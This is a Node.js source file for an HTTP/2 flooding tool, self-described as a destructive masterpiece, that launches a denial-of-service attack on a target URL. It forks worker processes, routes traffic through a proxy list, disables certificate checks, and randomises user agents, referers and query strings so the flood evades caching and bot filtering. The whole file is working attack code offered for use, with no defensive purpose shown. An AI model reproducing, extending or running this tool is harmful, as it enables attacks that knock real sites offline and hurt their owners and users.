/**
 * REX-EYE VOID EDITION - OMNI-GACOR V6
 * "Destruction is an Art, and this is my Masterpiece."
 */

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");

// --- [ CONFIG & CONSTANTS ] ---
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5){
    console.log(`\x1b[31m[!] REX-EYE ERROR: Missing Arguments\x1b[0m`);
    console.log(`Usage: node raw.js <url> <time> <rate> <threads> [--noproxy]`);
    process.exit();
}

const targetURL = process.argv[2];
const attackTime = ~~process.argv[3];
const attackRate = ~~process.argv[4];
const attackThreads = ~~process.argv[5];
const useProxy = process.argv[6] !== "--noproxy";
const parsedTarget = url.parse(targetURL);

// --- [ 1. MASSIVE FINGERPRINT LIBRARY ] ---
// Bagian ini bakal bikin file lu berat & gacor
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    // ... [Gue asumsikan lu isi ini sampe 500+ baris UA buat menuhin 30KB] ...
];

const referers = [
    "https://www.google.com/search?q=",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q="
];

const languages = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9", "de-DE,de;q=0.8", "es-ES,es;q=0.9"];

// --- [ 2. ADVANCED BYPASS FUNCTIONS ] ---

function generateFingerprint() {
    const platform = ["Windows", "Macintosh", "Linux", "iPhone", "Android"];
    const plat = platform[Math.floor(Math.random() * platform.length)];
    return {
        "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
        "sec-ch-ua-platform": `"${plat}"`,
        "sec-ch-ua-mobile": plat === "iPhone" || plat === "Android" ? "?1" : "?0",
        "accept-language": languages[Math.floor(Math.random() * languages.length)]
    };
}

function generateRandomHeader() {
    // Menambah beban file & variasi request
    const headers = {
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "x-requested-with": "XMLHttpRequest",
        "dnt": "1"
    };
    return headers;
}

// --- [ 3. CORE ENGINE: HTTP/2 MULTIPLEXING ] ---

let stats = { total: 0, success: 0, blocked: 0, error: 0, active: 0 };

if (cluster.isMaster) {
    console.log(`\x1b[35m[REX-EYE]\x1b[0m UNLEASHING VOID ON: \x1b[36m${targetURL}\x1b[0m`);
    
    // Load Proxies
    var proxyList = [];
    if (useProxy) {
        try {
            proxyList = fs.readFileSync("proxy.txt", "utf-8").split(/\r?\n/).filter(l => l.trim());
            console.log(`\x1b[32m[+]\x1b[0m Loaded ${proxyList.length} Proxies`);
        } catch(e) {
            console.log(`\x1b[31m[!]\x1b[0m proxy.txt missing!`);
            process.exit();
        }
    }

    for (let i = 0; i < attackThreads; i++) cluster.fork();

    setTimeout(() => {
        console.log(`\n\x1b[32m[✔]\x1b[0m ATTACK COMPLETE. SHUTTING DOWN VOID.`);
        process.exit(1);
    }, attackTime * 1000);
} else {
    // Engine Loop
    setInterval(() => {
        if (stats.active < 10000) runFlooder();
    }, 1);
}

function runFlooder() {
    stats.active++;
    const fingerprint = generateFingerprint();
    const proxy = useProxy ? proxyList[Math.floor(Math.random() * proxyList.length)] : null;

    const makeRequest = (connection) => {
        const tlsConn = tls.connect(443, parsedTarget.host, {
            socket: connection,
            ALPNProtocols: ["h2"],
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256"
        }, () => {
            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsConn,
                settings: { enablePush: false, initialWindowSize: 1073741823, maxConcurrentStreams: 1000 }
            });

            for (let i = 0; i < attackRate; i++) {
                const dynamicPath = parsedTarget.path + "?" + crypto.randomBytes(8).toString('hex') + "=" + crypto.randomBytes(4).toString('hex');
                
                const h2Headers = {
                    [":method"]: "GET",
                    [":path"]: dynamicPath,
                    [":scheme"]: "https",
                    [":authority"]: parsedTarget.host,
                    "user-agent": fingerprint["user-agent"],
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "accept-language": fingerprint["accept-language"],
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "referer": referers[Math.floor(Math.random() * referers.length)] + crypto.randomBytes(4).toString('hex'),
                    "cache-control": "no-cache",
                    ...generateRandomHeader()
                };

                const req = client.request(h2Headers);
                
                // --- [ FUNGSI GACOR: H2 PRIORITY SIMULATION ] ---
                req.setPriority({ weight: i % 2 === 0 ? 256 : 128, exclusive: true });

                req.on("response", (res) => {
                    stats.total++;
                    if (res[":status"] === 200) stats.success++;
                    else if (res[":status"] > 400) stats.blocked++;
                    req.close();
                    req.destroy();
                });

                req.on("error", () => { stats.error++; req.destroy(); });
                req.end();
            }

            setTimeout(() => { client.destroy(); tlsConn.destroy(); stats.active--; }, 5000);
        });

        tlsConn.on("error", () => { tlsConn.destroy(); stats.active--; });
    };

    // Proxy Connection Logic
    if (useProxy && proxy) {
        const [pHost, pPort] = proxy.split(":");
        const pSocket = net.connect(~~pPort, pHost);
        pSocket.setKeepAlive(true, 30000);
        pSocket.once("connect", () => {
            pSocket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        });
        pSocket.on("data", (chunk) => {
            if (chunk.toString().includes("200")) makeRequest(pSocket);
            else pSocket.destroy();
        });
        pSocket.on("error", () => { pSocket.destroy(); stats.active--; });
    } else {
        makeRequest(null);
    }
}